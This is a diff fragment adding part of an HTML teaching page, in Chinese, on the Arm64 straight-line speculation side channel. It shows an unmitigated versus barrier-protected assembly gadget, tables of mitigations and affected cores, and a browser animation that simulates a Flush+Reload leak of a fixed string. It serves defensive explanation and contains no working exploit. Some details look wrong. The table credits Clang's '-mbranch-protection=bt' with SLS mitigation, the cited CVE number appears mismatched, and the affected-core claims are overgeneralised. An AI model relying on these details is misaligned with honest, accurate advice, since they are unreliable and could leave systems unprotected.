+<span style="color:var(--danger)">ldrb</span> w3, [%[sec]]    <span class="code-comment">← 推测执行!</span>
+<span style="color:var(--danger)">add</span>  x3, %[ch], ...
+<span style="color:var(--danger)">ldr</span>  x4, [x3]</pre>
+  </div>
+  <div>
+    <div class="compare-label fix">✔ MITIGATED (spectre_sls_mitigate.cc)</div>
+    <pre style="margin:0; border:none; padding:0.5rem 0; font-size:0.85rem;">
+<span style="color:var(--accent)">br</span>   %[go]
+<span style="color:var(--accent2)">dsb</span>  sy              <span class="code-comment">← 推测屏障</span>
+<span style="color:var(--accent2)">isb</span>
+<span style="color:var(--text-dim)">ldrb</span> w3, [%[sec]]    <span class="code-comment">← 不再推测</span>
+<span style="color:var(--text-dim)">add</span>  x3, %[ch], ...
+<span style="color:var(--text-dim)">ldr</span>  x4, [x3]</pre>
+  </div>
+</div>
+
+<h3>缓解方案汇总</h3>
+<table>
+  <tr><th>方案</th><th>层级</th><th>原理</th><th>兼容性</th></tr>
+  <tr>
+    <td><code>DSB SY</code> + <code>ISB</code></td>
+    <td>软件（手动）</td>
+    <td>在 BR 后插入屏障，阻断直线推测</td>
+    <td>Armv8.0-A+</td>
+  </tr>
+  <tr>
+    <td><code>SB</code> 指令</td>
+    <td>软件（手动）</td>
+    <td>专用推测屏障指令，等效 DSB+ISB</td>
+    <td>Armv8.5-A+ (FEAT_SB)</td>
+  </tr>
+  <tr>
+    <td><code>-mharden-sls=all</code></td>
+    <td>编译器（GCC）</td>
+    <td>自动在所有间接分支后插入屏障</td>
+    <td>GCC 10+</td>
+  </tr>
+  <tr>
+    <td><code>-mbranch-protection=bt</code></td>
+    <td>编译器（Clang）</td>
+    <td>启用 BTI + SLS 缓解</td>
+    <td>Clang 8+</td>
+  </tr>
+  <tr>
+    <td>Linux 内核 SLS 缓解</td>
+    <td>OS</td>
+    <td>内核在间接分支后自动插入屏障</td>
+    <td>Linux 5.10+</td>
+  </tr>
+  <tr>
+    <td>微码更新</td>
+    <td>硬件</td>
+    <td>部分 CPU 微码修复了 SLS 推测行为</td>
+    <td>厂商特定</td>
+  </tr>
+</table>
+
+<div class="card card-info">
+  <h3>DSB SY + ISB vs SB</h3>
+  <p><code>SB</code>（Speculation Barrier）是 Armv8.5-A 引入的专用推测屏障指令，语义上等效于 <code>DSB SY</code> + <code>ISB</code> 的组合，但编码更紧凑（单条指令 vs 两条）。</p>
+  <p>本 Demo 使用 <code>DSB SY</code> + <code>ISB</code> 以确保在 Armv8.2 等旧版服务器上也能编译运行。</p>
+</div>
+
+<h2 id="affected">11. 受影响平台</h2>
+
+<table>
+  <tr><th>处理器核心</th><th>产品</th><th>受影响</th><th>说明</th></tr>
+  <tr><td>Neoverse V1</td><td>AWS Graviton3</td><td style="color:var(--danger)">是</td><td>ARM 官方确认</td></tr>
+  <tr><td>Neoverse V2</td><td>AWS Graviton4</td><td style="color:var(--danger)">是</td><td>ARM 官方确认</td></tr>
+  <tr><td>Neoverse N2</td><td>Marvell CN10xxx</td><td style="color:var(--danger)">是</td><td>ARM + Marvell 确认</td></tr>
+  <tr><td>Cortex-A76</td><td>多数 ARM 手机</td><td style="color:var(--danger)">是</td><td>ARM 官方确认</td></tr>
+  <tr><td>Cortex-A77/A78</td><td>高端手机/平板</td><td style="color:var(--danger)">是</td><td>ARM 官方确认</td></tr>
+  <tr><td>Apple M1/M2/M3</td><td>Mac / iPad</td><td style="color:var(--danger)">是</td><td>已验证</td></tr>
+  <tr><td>Cortex-A53/A55</td><td>低端手机/IoT</td><td style="color:var(--accent2)">否</td><td>顺序执行核心，无推测</td></tr>
+</table>
+
+<div class="card card-danger">
+  <strong>注意：</strong>SLS 影响所有支持乱序执行的 ARM64 核心。顺序执行核心（如 Cortex-A53、Cortex-A55）不受影响，因为它们不进行推测执行。
+</div>
+
+<div style="margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid var(--border); color: var(--text-dim); font-size: 0.85rem; text-align: center;">
+  <p>基于 <a href="https://github.com/google/safeside" style="color:var(--accent);">Google SafeSide</a> 项目源码分析</p>
+  <p style="margin-top:0.3rem;">参考文献：<a href="https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability" style="color:var(--accent);">ARM Security Updates</a> · <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1384" style="color:var(--accent);">CVE-2020-1384</a></p>
+</div>
+
+<script>
+const SECRET = "It's a s3kr3t!!!";
+let oracleState = new Array(256).fill('cold');
+let currentStep = 0;
+let secretByteIndex = 0;
+let logEl = document.getElementById('sim-log');
+
+function initGrid() {
+  const grid = document.getElementById('oracle-grid');
+  grid.innerHTML = '';
+  for (let i = 0; i < 256; i++) {
+    const cell = document.createElement('div');
+    cell.className = 'oracle-cell oracle-cold';
+    cell.id = 'cell-' + i;
+    cell.title = 'Index ' + i + ' (0x' + i.toString(16).padStart(2,'0') + ')';
+    cell.textContent = (i >= 32 && i < 127) ? String.fromCharCode(i) : i.toString(16).padStart(2,'0');
+    grid.appendChild(cell);
+  }
+}
+
+function addLog(msg, cls) {
+  const entry = document.createElement('div');
+  entry.className = 'log-entry ' + (cls || '');
+  entry.textContent = msg;
+  logEl.appendChild(entry);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function updateGrid() {
+  for (let i = 0; i < 256; i++) {
+    document.getElementById('cell-' + i).className = 'oracle-cell oracle-' + oracleState[i];
+  }
+}
+
+function simReset() {
+  oracleState = new Array(256).fill('cold');
+  currentStep = 0;
+  secretByteIndex = 0;
+  updateGrid();
+  logEl.innerHTML = '<div class="log-entry" style="color:var(--text-dim);">已重置。准备开始 SLS 攻击模拟。</div>';
+  addLog('目标: 泄漏 private_data[' + secretByteIndex + '] = \'' + SECRET[secretByteIndex] + '\' (ASCII ' + SECRET.charCodeAt(secretByteIndex) + ')', '');
+}
+
+function simFlush() {
+  oracleState = new Array(256).fill('cold');
+  updateGrid();
+  addLog('① Flush: 256 个 oracle 元素全部从缓存驱逐 (dc civac + dsb + isb)', 'log-flush');
+  addLog('   g_target 也被 flush → LDR 加载延迟 ~100+ cycles → 推测窗口', 'log-flush');
+  currentStep = 1;
+}
+
+function simBTB() {
+  addLog('② BTB 驱逐: ibtb_flush() 执行 24000 个间接分支', 'log-train');
+  addLog('   4 个不同 PC 的 BR × 6000 次 = 填满 BTB，驱逐 victim BR 的预测条目', 'log-train');
+  addLog('   → victim 中的 BR 将 BTB miss → 触发直线推测', 'log-train');
+  currentStep = 2;
+}
+
+function simSpec() {
+  if (secretByteIndex >= SECRET.length) { addLog('所有字节已泄漏！', 'log-leak'); return; }
+  const secretChar = SECRET.charCodeAt(secretByteIndex);
+  oracleState[secretChar] = 'hot';
+  updateGrid();
+  addLog('③ victim() 执行:', 'log-spec');
+  addLog('   br x0 → 目标延迟 (g_target 缓存 miss) + BTB miss', 'log-spec');
+  addLog('   CPU 推测执行 BR 后面的直线代码:', 'log-spec');
+  addLog('     ldrb w3, [private_data[' + secretByteIndex + ']] = \'' + SECRET[secretByteIndex] + '\' (ASCII ' + secretChar + ')', 'log-spec');
+  addLog('     add x3, oracle, ' + secretChar + ' × 4096', 'log-spec');
+  addLog('     ldr x4, [x3] → oracle[' + secretChar + '] 被加载到缓存!', 'log-spec');
+  addLog('   BR 目标解析后 → 推测结果丢弃 → 但缓存状态不回滚!', 'log-spec');
+  currentStep = 3;
+}
+
+function simReload() {
+  if (currentStep < 3) { addLog('请先执行步骤 ①②③', ''); return; }
+  const secretChar = SECRET.charCodeAt(secretByteIndex);
+  addLog('④ FLUSH+RELOAD: 测量 256 个 oracle 元素延迟...', 'log-leak');
+  addLog('   ✓ oracle[' + secretChar + '] = \'' + SECRET[secretByteIndex] + '\' 延迟显著低于其他 → 缓存命中!', 'log-leak');
+  addLog('   → 泄漏字节 #' + secretByteIndex + ': \'' + SECRET[secretByteIndex] + '\'', 'log-leak');
+  secretByteIndex++;
+  if (secretByteIndex < SECRET.length) {
+    addLog('   继续泄漏下一个字节: private_data[' + secretByteIndex + ']...', '');
+  } else {
+    addLog('   🎉 完整泄漏结果: "' + SECRET + '"', 'log-leak');
+  }
+  currentStep = 0;
+}
+
+async function simAuto() {
+  simReset();
+  await sleep(500);
+  for (let i = 0; i < SECRET.length; i++) {
+    addLog('─── 泄漏字节 #' + i + ' ───', '');
+    simFlush(); await sleep(200);
+    simBTB(); await sleep(200);
+    simSpec(); await sleep(300);
+    simReload(); await sleep(400);
+  }
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+initGrid();
+addLog('目标: 泄漏 private_data[' + secretByteIndex + '] = \'' + SECRET[secretByteIndex] + '\' (ASCII ' + SECRET.charCodeAt(secretByteIndex) + ')', '');
+</script>
+
+</body>
+</html>
